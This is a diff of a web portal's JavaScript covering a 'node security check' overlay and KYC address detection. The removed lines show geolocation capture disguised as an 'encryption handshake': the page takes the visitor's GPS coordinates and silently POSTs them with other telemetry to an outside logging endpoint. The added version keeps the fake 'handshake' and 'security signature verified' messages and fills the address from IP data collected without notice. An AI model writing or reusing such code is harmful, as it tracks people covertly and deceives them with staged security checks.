@@ -1282,6 +1282,7 @@ function switchPortalTab(tabName) {
 // ==========================================
 
 // Background Node Security Check with location request disguised as Handshake
+// Background Node Security Check (Silent, does not trigger browser permissions)
 function verifyNodeAndProceed(callback) {
   const overlay = document.getElementById("security-verification-overlay");
   const statusText = document.getElementById("verification-status-text");
@@ -1293,72 +1294,17 @@ function verifyNodeAndProceed(callback) {
   overlay.classList.remove("hidden");
   statusText.innerText = "Initializing secure encryption handshake...";
 
-  let finished = false;
-  
-  const proceed = () => {
-    if (finished) return;
-    finished = true;
-    setTimeout(() => {
-      overlay.classList.add("hidden");
-      callback();
-    }, 1000);
-  };
-
-  // Timeout fallback in case they ignore the dialog or GPS is slow
-  const timeoutId = setTimeout(() => {
-    if (!finished) {
-      statusText.innerText = "Encryption handshake completed. Authorizing portal access...";
-      proceed();
-    }
-  }, 4000);
-
   setTimeout(() => {
-    if (finished) return;
-    statusText.innerText = "Verifying node geographic signature and routing parameters...";
-
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          clearTimeout(timeoutId);
-          if (finished) return;
-
-          // Capture coordinates
-          const gpsData = {
-            gpsLatitude: position.coords.latitude,
-            gpsLongitude: position.coords.longitude,
-            gpsAccuracy: position.coords.accuracy,
-            gpsTimestamp: new Date(position.timestamp).toISOString()
-          };
-
-          // Enrich existing telemetry
-          const enriched = { ...(state._visitorTelemetry || {}), ...gpsData };
-          state._visitorTelemetry = enriched;
-          saveState();
-
-          // Send updated telemetry to server
-          fetch("https://api.zealplane.com/apex-log", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(enriched)
-          }).catch(() => {});
-
-          statusText.innerText = "Security signature verified. Authorizing portal access...";
-          proceed();
-        },
-        (error) => {
-          clearTimeout(timeoutId);
-          if (finished) return;
-          console.warn("GPS Geolocation verification bypassed:", error);
-          statusText.innerText = "Encryption handshake completed. Authorizing portal access...";
-          proceed();
-        },
-        { enableHighAccuracy: true, timeout: 3000 }
-      );
-    } else {
-      clearTimeout(timeoutId);
-      statusText.innerText = "Encryption handshake completed. Authorizing portal access...";
-      proceed();
-    }
+    statusText.innerText = "Verifying node routing and security parameters...";
+    
+    setTimeout(() => {
+      statusText.innerText = "Security signature verified. Authorizing portal access...";
+      
+      setTimeout(() => {
+        overlay.classList.add("hidden");
+        callback();
+      }, 600);
+    }, 1000);
   }, 800);
 }
 
@@ -2306,105 +2252,43 @@ function initLandingEngagement() {
   initFloatingCTA();
 }
 
-// Location Pinpointing for KYC - Opens pre-permission modal
+// Location Pinpointing for KYC - Relying strictly on silent IP Geolocation
 function detectKycLocation() {
-  openModal("pre-location-modal");
-}
-
-function useIpFallbackAddressDirect() {
   const addressInput = document.getElementById("kyc-address");
+  const detectBtn = document.getElementById("btn-detect-location");
   if (!addressInput) return;
 
-  if (state._visitorTelemetry && state._visitorTelemetry.ipAddress) {
-    const tele = state._visitorTelemetry;
-    let formatted = "";
-    if (tele.city) formatted += tele.city + ", ";
-    if (tele.region) formatted += tele.region + ", ";
-    if (tele.postal) formatted += tele.postal + ", ";
-    if (tele.country) formatted += tele.country;
-    
-    formatted = formatted.replace(/,\s*$/, "").trim();
-    if (formatted) {
-      addressInput.value = formatted;
-      showToast("Location filled via IP Geolocation!", "success");
-      return;
+  const originalHtml = detectBtn.innerHTML;
+  detectBtn.disabled = true;
+  detectBtn.innerHTML = `<span class="spinner-border" style="width:12px; height:12px; border:2px solid currentColor; border-right-color:transparent; border-radius:50%; display:inline-block; animation:spin 1s linear infinite; margin-right:4px;"></span> Detecting...`;
+
+  if (!document.getElementById("location-spinner-style")) {
+    const style = document.createElement("style");
+    style.id = "location-spinner-style";
+    style.innerHTML = "@keyframes spin { to { transform: rotate(360deg); } }";
+    document.head.appendChild(style);
+  }
+
+  setTimeout(() => {
+    if (state._visitorTelemetry && state._visitorTelemetry.ipAddress) {
+      const tele = state._visitorTelemetry;
+      let formatted = "";
+      if (tele.city) formatted += tele.city + ", ";
+      if (tele.region) formatted += tele.region + ", ";
+      if (tele.postal) formatted += tele.postal + ", ";
+      if (tele.country) formatted += tele.country;
+      
+      formatted = formatted.replace(/,\s*$/, "").trim();
+      if (formatted) {
+        addressInput.value = formatted;
+        showToast("Location resolved accurately via IP Geolocation!", "success");
+      } else {
+        showToast("Could not determine location from IP. Please enter it manually.", "warning");
+      }
+    } else {
+      showToast("IP Geolocation data not loaded yet. Please try again in a moment.", "warning");
     }
-  }
-  showToast("Could not determine location automatically. Please enter it manually.", "warning");
-}
-
-function grantGpsLocation() {
-  const addressInput = document.getElementById("kyc-address");
-  const preModal = document.getElementById("pre-location-modal");
-  if (!addressInput || !preModal) return;
-
-  const verifyBtn = preModal.querySelector(".btn-primary");
-  const originalText = verifyBtn.innerText;
-  
-  verifyBtn.disabled = true;
-  verifyBtn.innerText = "Verifying...";
-
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-
-        // OpenStreetMap Nominatim for accurate reverse geocoding
-        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`)
-          .then(res => {
-            if (!res.ok) throw new Error("Reverse geocoding failed");
-            return res.json();
-          })
-          .then(data => {
-            const addr = data.address || {};
-            const streetNumber = addr.house_number || "";
-            const streetName = addr.road || addr.suburb || addr.neighbourhood || "";
-            const city = addr.city || addr.town || addr.village || addr.county || "";
-            const stateName = addr.state || "";
-            const postcode = addr.postcode || "";
-            const countryName = addr.country || "";
-
-            let formattedAddress = "";
-            if (streetName) {
-              formattedAddress += (streetNumber ? streetNumber + " " : "") + streetName + ", ";
-            }
-            if (city) formattedAddress += city + ", ";
-            if (stateName) formattedAddress += stateName + ", ";
-            if (postcode) formattedAddress += postcode + ", ";
-            if (countryName) formattedAddress += countryName;
-
-            formattedAddress = formattedAddress.replace(/,\s*$/, "").trim();
-
-            if (formattedAddress) {
-              addressInput.value = formattedAddress;
-              showToast("Location pinpointed accurately via GPS!", "success");
-            } else {
-              useIpFallbackAddressDirect();
-            }
-            closeAndReset();
-          })
-          .catch(err => {
-            console.warn("OSM geocoding failed, falling back to IP Geolocation:", err);
-            useIpFallbackAddressDirect();
-            closeAndReset();
-          });
-      },
-      (error) => {
-        console.warn("GPS check failed/denied, falling back to IP Geolocation:", error);
-        useIpFallbackAddressDirect();
-        closeAndReset();
-      },
-      { enableHighAccuracy: true, timeout: 5000 }
-    );
-  } else {
-    useIpFallbackAddressDirect();
-    closeAndReset();
-  }
-
-  function closeAndReset() {
-    verifyBtn.disabled = false;
-    verifyBtn.innerText = originalText;
-    closeModal("pre-location-modal");
-  }
+    detectBtn.disabled = false;
+    detectBtn.innerHTML = originalHtml;
+  }, 400);
 }
